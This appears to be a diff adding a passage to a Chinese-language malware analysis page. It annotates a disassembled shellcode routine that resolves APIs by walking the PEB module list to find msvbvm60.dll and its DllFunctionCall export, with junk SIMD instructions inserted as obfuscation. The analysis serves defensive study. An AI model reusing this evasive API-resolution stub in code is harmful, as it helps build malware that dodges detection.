@@ -1344,6 +1344,102 @@ IwoPMc;
 ....
 .text:004644C3 call    dword ptr [eax+2B0h]
 
+</code></pre><p>在shellcode中并没有使用常规的方式获取api地址，而是先找到msvbvm60模块的地址，再通过到处函数DllFunction来获得对应API的地址。</p>
+<pre><code>.text:0043B10F get_api_address proc near                                                                           ; CODE XREF: sub_43AF88:loc_43AF89↑p
+.text:0043B10F                                                                                                     ; sub_43B07C+2B↑p
+.text:0043B10F
+.text:0043B10F var_14          = dword ptr -14h
+.text:0043B10F anonymous_2     = dword ptr -10h
+.text:0043B10F anonymous_1     = dword ptr -0Ch
+.text:0043B10F anonymous_0     = dword ptr -8
+.text:0043B10F var_4           = dword ptr -4
+.text:0043B10F
+.text:0043B10F                 mov     eax, large fs:30h ;peb地址
+.text:0043B115                 packuswb mm1, mm1
+.text:0043B118                 mov     eax, [eax+0Ch] ;PEB_LDR_DATA
+.text:0043B11B                 pcmpgtb mm5, mm4
+.text:0043B11E                 mov     eax, [eax+14h];get InMemoryOrderModuleList
+.text:0043B121                 pcmpeqw mm2, mm7
+.text:0043B124
+.text:0043B124 loc_43B124:                                                                                         ; CODE XREF: get_api_address+29↓j
+.text:0043B124                                                                                                     ; get_api_address+36↓j
+.text:0043B124                 mov     eax, [eax]
+.text:0043B126                 punpckhdq mm1, mm3
+.text:0043B129                 mov     ebx, [eax+28h]
+.text:0043B12C                 pcmpgtw xmm7, xmm6
+.text:0043B130                 mov     esi, 53004Ch     ; 
+.text:0043B135                 inc     esi              ;MS for msvbvm60.dll 
+.text:0043B136                 cmp     [ebx], esi
+.text:0043B138                 jnz     short loc_43B124
+.text:0043B13A                 pcmpgtb xmm3, xmm7
+.text:0043B13E                 cmp     dword ptr [ebx+4], 420056h ;VB for MS for msvbvm60.dll 
+.text:0043B145                 jnz     short loc_43B124
+.text:0043B147                 pcmpgtd xmm0, xmm3
+.text:0043B14B                 mov     esi, [eax+10h]
+.text:0043B14E                 pcmpgtw xmm6, xmm6
+.text:0043B152                 push    esi
+.text:0043B153                 pcmpgtb mm3, mm4
+.text:0043B156                 mov     ebx, [esi+3Ch]
+.text:0043B159                 punpckhwd xmm0, xmm2
+.text:0043B15D                 mov     esi, [esp+4+var_4]
+.text:0043B160                 punpckhbw xmm5, xmm1
+.text:0043B164                 add     esi, ebx
+.text:0043B166                 pcmpeqd xmm0, xmm1
+.text:0043B16A                 mov     ebx, [esi+78h]
+.text:0043B16D                 pcmpeqw mm6, mm3
+.text:0043B170                 mov     eax, [esp+4+var_4]
+.text:0043B173                 punpckhwd xmm3, xmm7
+.text:0043B177                 add     eax, ebx
+.text:0043B179                 punpckhbw xmm4, xmm4
+.text:0043B17D                 mov     esi, eax
+.text:0043B17F                 pcmpeqb xmm4, xmm6
+.text:0043B183                 add     esi, 28h ; &#39;(&#39;
+.text:0043B186                 pcmpeqw mm1, mm2
+.text:0043B189
+.text:0043B189 loc_43B189:                                                                                         ; CODE XREF: get_api_address+80↓j
+.text:0043B189                                                                                                    get_api_address+94↓j ...
+.text:0043B189                 lodsd
+.text:0043B18A                 punpckhdq mm0, mm6
+.text:0043B18D                 test    eax, eax
+.text:0043B18F                 jz      short loc_43B189
+.text:0043B191                 packssdw xmm4, xmm7
+.text:0043B195                 add     eax, [esp+4+var_4]
+.text:0043B198                 pcmpeqb xmm6, xmm2
+.text:0043B19C                 mov     ebx, 83EC8B55h    ;DllFunctionCall 函数特征
+.text:0043B1A1                 cmp     [eax], ebx
+.text:0043B1A3                 jnz     short loc_43B189
+.text:0043B1A5                 punpckhwd mm0, mm4
+.text:0043B1A8                 cmp     dword ptr [eax+4], 8D560CECh  ;DllFunctionCall 函数特征
+.text:0043B1AF                 jnz     short loc_43B189
+.text:0043B1B1                 pcmpgtb mm6, mm4
+.text:0043B1B4                 pop     ebx
+.text:0043B1B5                 pcmpeqd xmm0, xmm1
+.text:0043B1B9                 xor     ebx, ebx
+.text:0043B1BB                 pcmpeqw mm6, mm3
+.text:0043B1BE                 push    ebx
+.text:0043B1BF                 punpckhwd xmm3, xmm7
+.text:0043B1C3                 push    ebx
+.text:0043B1C4                 punpckhbw xmm4, xmm4
+.text:0043B1C8                 push    ebx
+.text:0043B1C9                 pcmpeqb xmm4, xmm6
+.text:0043B1CD                 push    esp
+.text:0043B1CE                 pcmpeqw mm1, mm2
+.text:0043B1D1                 push    0
+.text:0043B1D3                 punpckhdq mm0, mm6
+.text:0043B1D6                 add     [esp+14h+var_14], 40000h
+.text:0043B1DD                 packssdw xmm4, xmm7
+.text:0043B1E1                 push    edx
+.text:0043B1E2                 pcmpeqb xmm6, xmm2
+.text:0043B1E6                 push    ecx
+.text:0043B1E7                 punpckhwd mm0, mm4
+.text:0043B1EA                 push    esp
+.text:0043B1EB                 pcmpgtb mm6, mm4
+.text:0043B1EE                 call    eax
+.text:0043B1F0                 pcmpeqd xmm0, xmm1
+.text:0043B1F4                 add     esp, 1Ch
+.text:0043B1F7                 pcmpeqw mm6, mm3
+.text:0043B1FA                 retn
+.text:0043B1FA get_api_address endp
 </code></pre>
       
       
